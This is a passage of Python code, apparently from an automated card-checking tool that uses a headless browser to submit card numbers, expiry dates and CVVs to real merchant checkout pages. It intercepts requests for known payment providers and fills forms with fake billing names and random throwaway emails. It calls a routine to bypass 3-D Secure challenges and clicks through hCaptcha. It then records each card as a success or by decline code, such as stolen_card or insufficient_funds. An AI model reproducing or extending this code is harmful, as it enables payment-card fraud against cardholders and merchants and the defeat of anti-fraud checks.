                provider = detect_provider(url, html)
                submit_sels = GENERIC_SUBMIT_SELS

                if provider == "stripe":
                    submit_sels = await _stripe_fill_and_intercept(page, card)

                elif provider in PROVIDER_DOMAINS:
                    domains, extras = PROVIDER_DOMAINS[provider]
                    intercept_fn = _make_generic_intercept(domains, extras)

                    async def _route(route: Route, request: Request):
                        await intercept_fn(route, request, card)

                    await page.route("**/*", _route)

                    await _try_fill(page, GENERIC_CARD_SELS,  GENERIC_MASKED_CARD)
                    await asyncio.sleep(0.2)
                    await _try_fill(page, GENERIC_EXP_SELS,   GENERIC_MASKED_EXPIRY)
                    await asyncio.sleep(0.2)
                    await _try_fill(page, GENERIC_CVC_SELS,   GENERIC_MASKED_CVV)
                    await _try_fill(page, GENERIC_NAME_SELS,  FAKE_BILLING["name"])
                    await _try_fill(page, GENERIC_EMAIL_SELS,
                                    f"nacht{random.randint(100,9999)}@gmail.com")

                else:
                    # Unknown provider — try to fill anyway
                    await _try_fill(page, GENERIC_CARD_SELS,  card["card"])
                    await asyncio.sleep(0.2)
                    await _try_fill(page, GENERIC_EXP_SELS,   f"{card['month']}/{card['year']}")
                    await asyncio.sleep(0.2)
                    await _try_fill(page, GENERIC_CVC_SELS,   card["cvv"])
                    await _try_fill(page, GENERIC_NAME_SELS,  FAKE_BILLING["name"])
                    await _try_fill(page, GENERIC_EMAIL_SELS,
                                    f"nacht{random.randint(100,9999)}@gmail.com")

                # fill billing address (harmless if fields don't exist)
                await _fill_billing(page)

                # submit
                submitted = await _try_click(page, submit_sels)
                if not submitted:
                    res["decline_code"] = "submit_not_found"
                    res["error"]        = "Submit button not found"
                    res["response_time"] = round(time.time() - t0, 2)
                    self.fails += 1
                    await browser.close()
                    self.results.append(res)
                    return res

                # wait for result
                await asyncio.sleep(5)

                # 3DS handling
                if await _wait_for_3ds(page, timeout_ms=10000):
                    await _bypass_3ds(page)
                    await asyncio.sleep(5)

                # handle hcaptcha
                try:
                    frame = page.frame_locator('iframe[src*="hcaptcha.com"]')
                    cb = frame.locator("#checkbox").first
                    if await cb.is_visible(timeout=2000):
                        await cb.click()
                        await asyncio.sleep(2)
                except Exception:
                    pass

                res["response_time"] = round(time.time() - t0, 2)
                cur_url = page.url.lower()

                SUCCESS_KEYWORDS = ("receipt", "thank", "success", "order_confirmation",
                                    "complete", "confirmed", "order-received", "thankyou",
                                    "thank-you", "payment_success", "paid")
                DECLINE_KEYWORDS = ("declined", "card was declined", "do_not_honor",
                                    "insufficient_funds", "lost_card", "stolen_card",
                                    "expired_card", "incorrect_cvc", "processing_error",
                                    "invalid_expiry", "your card")

                if any(k in cur_url for k in SUCCESS_KEYWORDS):
                    res["success"]     = True
                    res["receipt_url"] = page.url
                    self.successes += 1
                else:
                    body = ""
                    try:
                        body = (await page.text_content("body") or "").lower()
                    except Exception:
                        pass

                    if any(k in cur_url for k in SUCCESS_KEYWORDS) or \
                       any(k in body for k in SUCCESS_KEYWORDS):
                        res["success"]     = True
                        res["receipt_url"] = page.url
                        self.successes += 1
                    else:
                        code = "unknown"
                        for kw in DECLINE_KEYWORDS:
                            if kw in body:
                                code = kw.replace(" ", "_")
                                break
                        res["decline_code"] = code
                        self.fails += 1

                await browser.close()

        except Exception as e:
            res["error"]         = str(e)
            res["decline_code"]  = "exception"
            res["response_time"] = round(time.time() - t0, 2)
            self.fails          += 1

        self.results.append(res)
        return res
